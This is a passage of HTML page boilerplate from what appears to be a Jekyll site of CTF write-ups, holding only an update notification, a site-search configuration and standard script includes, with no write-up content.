class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/CTF-writeups-public/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5"></p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script defer src="/CTF-writeups-public/assets/js/dist/commons.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/CTF-writeups-public/app.js"></script>
